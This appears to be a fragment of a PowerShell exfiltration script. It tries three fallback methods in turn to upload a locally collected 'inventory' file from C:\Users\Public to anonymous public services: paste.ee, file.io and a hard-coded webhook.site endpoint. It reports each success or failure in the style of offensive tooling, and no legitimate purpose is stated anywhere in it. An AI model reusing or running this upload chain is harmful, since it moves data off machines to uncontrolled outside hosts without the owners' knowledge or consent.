# Method 1: paste.ee fixed
Write-Host "[*] Trying paste.ee..." -ForegroundColor Cyan
try {
    $payload = ConvertTo-Json @{sections=@(@{name="inventory";syntax="text";contents=$body})}
    $response = Invoke-RestMethod -Uri "https://paste.ee/api/paste" -Method Post -ContentType "application/json" -Body $payload -Headers @{Accept="application/json"}
    Write-Host "[+] paste.ee success!" -ForegroundColor Green
    Write-Host "[+] Response: $($response | ConvertTo-Json -Depth 5)" -ForegroundColor Green
    $uploaded = $true
} catch {
    Write-Host "[-] paste.ee failed: $($_.Exception.Message)" -ForegroundColor Red
}

# Method 2: file.io fixed for older PowerShell
if (-not $uploaded) {
    Write-Host "[*] Trying file.io..." -ForegroundColor Cyan
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\inventory.txt")
        $fileEnc = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"inventory.txt`"",
            "Content-Type: text/plain",
            "",
            $fileEnc,
            "--$boundary--"
        )
        $multipartBody = $bodyLines -join "`r`n"
        $response = Invoke-RestMethod -Uri "https://file.io/?expires=1d" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $multipartBody
        Write-Host "[+] file.io success!" -ForegroundColor Green
        Write-Host "[+] URL: $($response.link)" -ForegroundColor Green
        $uploaded = $true
    } catch {
        Write-Host "[-] file.io failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Method 3: webhook.site - make sure you grab a fresh unique ID from webhook.site
if (-not $uploaded) {
    Write-Host "[*] Trying webhook.site..." -ForegroundColor Cyan
    try {
        $response = Invoke-RestMethod -Uri "https://webhook.site/876989bb-721a-41a8-8fc4-0f8c381bd65d" -Method Post -Body $body -ContentType "text/plain; charset=utf-8"
        Write-Host "[+] webhook.site success!" -ForegroundColor Green
        $uploaded = $true
    } catch {
        Write-Host "[-] webhook.site failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}
